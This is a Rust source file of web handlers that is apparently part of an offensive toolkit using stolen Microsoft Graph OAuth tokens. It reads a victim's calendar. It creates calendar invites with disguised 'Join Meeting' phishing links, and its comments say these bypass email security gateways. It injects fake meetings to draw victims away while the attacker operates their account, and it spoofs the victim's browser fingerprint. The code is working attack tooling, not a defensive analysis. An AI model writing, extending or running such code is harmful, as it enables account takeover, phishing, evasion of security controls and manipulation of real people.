#![allow(non_snake_case)]

use actix_web::{web, HttpResponse, Responder};
use serde::{Deserialize, Serialize};

use crate::graph_client::GraphClient;

// === Calendar Request/Response Types ===

#[derive(Debug, Deserialize)]
pub struct CalendarQuery {
    pub token_id: String,
    pub start_date: Option<String>,
    pub end_date: Option<String>,
}

#[derive(Debug, Serialize)]
pub struct CalendarEventsResponse {
    pub status: String,
    pub events: Vec<GraphEvent>,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct GraphEvent {
    pub id: String,
    pub subject: String,
    pub body: Option<EventBody>,
    pub start: Option<EventDateTime>,
    pub end: Option<EventDateTime>,
    pub location: Option<EventLocation>,
    pub attendees: Option<Vec<EventAttendee>>,
    pub isAllDay: Option<bool>,
    pub isCancelled: Option<bool>,
    pub organizer: Option<EventOrganizer>,
    pub createdDateTime: Option<String>,
    pub lastModifiedDateTime: Option<String>,
    pub recurrence: Option<serde_json::Value>,
    pub responseStatus: Option<EventResponseStatus>,
    pub showAs: Option<String>,
    pub sensitivity: Option<String>,
    pub categories: Option<Vec<String>>,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct EventBody {
    pub content: Option<String>,
    pub contentType: Option<String>,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct EventDateTime {
    pub dateTime: String,
    pub timeZone: String,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct EventLocation {
    pub displayName: Option<String>,
    pub address: Option<serde_json::Value>,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct EventAttendee {
    pub emailAddress: Option<EventEmailAddress>,
    #[serde(rename = "type")]
    pub attendee_type: Option<String>,
    pub status: Option<EventResponseStatus>,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct EventOrganizer {
    pub emailAddress: Option<EventEmailAddress>,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct EventEmailAddress {
    pub name: Option<String>,
    pub address: Option<String>,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct EventResponseStatus {
    pub response: Option<String>,
    pub time: Option<String>,
}

// === Helper Functions ===

async fn get_access_token(
    token_id: &str,
    state: &web::Data<crate::AppState>,
) -> Result<String, HttpResponse> {
    let token = match crate::retrieve_any_token(&state, token_id).await {
        Ok(t) => t,
        Err(_) => return Err(HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"}))),
    };

    let access_token = match crate::refresh_access_token(&state, &token.refresh_token).await {
        Some(t) => t,
        None => token.access_token,
    };

    Ok(access_token)
}

// === Calendar Events Handlers ===

pub async fn list_calendar_events_handler(
    query: web::Query<CalendarQuery>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let access_token = match get_access_token(&query.token_id, &state).await {
        Ok(t) => t,
        Err(resp) => return resp,
    };

    let client = GraphClient::new();
    
    // Build URL with optional date range
    let mut url = client.url(
        "/v1.0/me/events?$top=50&$orderby=start/dateTime DESC&$select=id,subject,body,start,end,location,attendees,isAllDay,isCancelled,organizer,createdDateTime,lastModifiedDateTime,recurrence,responseStatus,showAs,sensitivity,categories"
    );
    
    // If date range provided, use calendarView instead
    if let (Some(start), Some(end)) = (&query.start_date, &query.end_date) {
        url = client.url(&format!(
            "/v1.0/me/calendar/calendarView?startDateTime={}&endDateTime={}&$top=50&$select=id,subject,body,start,end,location,attendees,isAllDay,isCancelled,organizer,createdDateTime,lastModifiedDateTime,recurrence,responseStatus,showAs,sensitivity,categories",
            urlencoding::encode(start),
            urlencoding::encode(end)
        ));
    }

    match client.client()
        .get(&url)
        .header("Authorization", format!("Bearer {}", access_token))
        .send()
        .await
    {
        Ok(response) => {
            if response.status().is_success() {
                let data: serde_json::Value = response.json().await.unwrap_or_default();
                let events: Vec<GraphEvent> = serde_json::from_value(
                    data.get("value").cloned().unwrap_or(serde_json::Value::Array(vec![]))
                ).unwrap_or_default();
                
                HttpResponse::Ok().json(CalendarEventsResponse {
                    status: "success".to_string(),
                    events,
                })
            } else if response.status() == 403 {
                // Consumer accounts get 403 for Calendar
                let body_text = response.text().await.unwrap_or_default();
                HttpResponse::Forbidden().json(serde_json::json!({
                    "error": "calendar_access_denied",
                    "message": "Calendar access requires a Microsoft 365 work or school account.",
                    "details": body_text
                }))
            } else {
                let body_text = response.text().await.unwrap_or_default();
                eprintln!("[calendar] Failed to fetch events: {}", body_text);
                HttpResponse::InternalServerError().json(serde_json::json!({
                    "error": "fetch_events_failed",
                    "details": body_text
                }))
            }
        }
        Err(e) => {
            eprintln!("[calendar] Fetch events request failed: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "fetch_events_failed",
                "details": format!("{}", e)
            }))
        }
    }
}

/// Create a calendar event with an OAuth lure link embedded in the body.
/// This delivers the phishing link via calendar invitation instead of email,
/// bypassing email security gateways (EOP, Safe Links, etc.).
#[derive(Debug, Deserialize)]
pub struct CalendarLureRequest {
    pub token_id: String,
    pub subject: String,
    pub start_time: String,
    pub duration_minutes: Option<i32>,
    pub lure_link: String,
    pub location: Option<String>,
}

pub async fn calendar_lure_handler(
    body: web::Json<CalendarLureRequest>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token = match crate::retrieve_any_token(&state, &body.token_id).await {
        Ok(t) => t,
        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    };
    let access_token = crate::refresh_access_token(&state, &token.refresh_token).await
        .unwrap_or_else(|| token.access_token.clone());

    let duration = body.duration_minutes.unwrap_or(30);
    let location = body.location.as_deref().unwrap_or("Online Meeting");

    let start_dt = match chrono::DateTime::parse_from_rfc3339(&body.start_time) {
        Ok(dt) => dt,
        Err(_) => return HttpResponse::BadRequest().json(serde_json::json!({"error": "Invalid start_time format"})),
    };
    let end_dt = start_dt + chrono::Duration::minutes(duration as i64);

    // Build HTML body with embedded OAuth link — looks like a legitimate
    // meeting join link but actually captures the token
    let html_body = format!(
        r#"<p>You have been invited to a meeting. Please review the agenda and join using the link below.</p>
<p><a href="{}" style="display: inline-block; padding: 10px 24px; background-color: #0078d4; color: #ffffff; text-decoration: none; border-radius: 4px; font-family: Segoe UI, Arial, sans-serif;">Join Meeting</a></p>
<p style="color: #666; font-size: 12px;">This meeting was scheduled from Microsoft Teams. Please join on time.</p>"#,
        body.lure_link
    );

    let payload = serde_json::json!({
        "subject": body.subject,
        "body": {
            "contentType": "HTML",
            "content": html_body
        },
        "start": {
            "dateTime": start_dt.format("%Y-%m-%dT%H:%M:%S").to_string(),
            "timeZone": "UTC"
        },
        "end": {
            "dateTime": end_dt.format("%Y-%m-%dT%H:%M:%S").to_string(),
            "timeZone": "UTC"
        },
        "location": {
            "displayName": location
        },
        "isOnlineMeeting": false,
        "responseRequested": true
    });

    let client = GraphClient::with_fingerprint(
        token.user_agent.clone(),
        token.accept_language.clone(),
    );

    match client.create_calendar_event(&access_token, payload).await {
        Ok(event) => {
            eprintln!("[calendar] Created lure calendar event '{}' with OAuth link", body.subject);
            HttpResponse::Ok().json(serde_json::json!({
                "success": true,
                "event_id": event.id,
                "subject": body.subject,
                "start": body.start_time,
                "message": "Calendar lure event created — OAuth link embedded in meeting body. Bypasses email security."
            }))
        }
        Err(e) => {
            eprintln!("[calendar] Failed to create lure event: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "calendar_lure_failed",
                "details": format!("{}", e)
            }))
        }
    }
}

// ============================================================
// SILENT CALENDAR MANIPULATION — Inject fake meetings
// ============================================================

#[derive(Debug, Deserialize)]
pub struct InjectMeetingRequest {
    pub token_id: String,
    pub subject: String,
    pub start_time: String,
    pub duration_minutes: Option<i32>,
    pub location: Option<String>,
    pub body: Option<String>,
}

/// Inject a fake meeting into the victim's calendar. This manipulates
/// their behavior — e.g., an "Emergency budget review at 3 PM" gets them
/// away from their desk while you operate from their account.
pub async fn inject_meeting_handler(
    body: web::Json<InjectMeetingRequest>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token = match crate::retrieve_any_token(&state, &body.token_id).await {
        Ok(t) => t,
        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    };
    let access_token = crate::refresh_access_token(&state, &token.refresh_token).await
        .unwrap_or_else(|| token.access_token.clone());

    let duration = body.duration_minutes.unwrap_or(30);
    let location = body.location.as_deref().unwrap_or("Conference Room A");
    let meeting_body = body.body.as_deref().unwrap_or("Please join the meeting on time. This is an important discussion that requires your presence.");

    // Calculate end time from start + duration
    let start_dt = match chrono::DateTime::parse_from_rfc3339(&body.start_time) {
        Ok(dt) => dt,
        Err(_) => return HttpResponse::BadRequest().json(serde_json::json!({"error": "Invalid start_time format. Use ISO 8601 (e.g., 2026-06-19T15:00:00Z)"})),
    };
    let end_dt = start_dt + chrono::Duration::minutes(duration as i64);

    let payload = serde_json::json!({
        "subject": body.subject,
        "body": {
            "contentType": "HTML",
            "content": format!("<p>{}</p>", meeting_body)
        },
        "start": {
            "dateTime": start_dt.format("%Y-%m-%dT%H:%M:%S").to_string(),
            "timeZone": "UTC"
        },
        "end": {
            "dateTime": end_dt.format("%Y-%m-%dT%H:%M:%S").to_string(),
            "timeZone": "UTC"
        },
        "location": {
            "displayName": location
        },
        "isOnlineMeeting": false,
        "responseRequested": false
    });

    let client = GraphClient::with_fingerprint(
        token.user_agent.clone(),
        token.accept_language.clone(),
    );

    match client.create_calendar_event(&access_token, payload).await {
        Ok(event) => {
            eprintln!("[calendar] Injected fake meeting '{}' at {}", body.subject, body.start_time);
            HttpResponse::Ok().json(serde_json::json!({
                "success": true,
                "event_id": event.id,
                "subject": body.subject,
                "start": body.start_time,
                "message": "Fake meeting injected into victim's calendar"
            }))
        }
        Err(e) => {
            eprintln!("[calendar] Failed to inject meeting: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "inject_meeting_failed",
                "details": format!("{}", e)
            }))
        }
    }
}
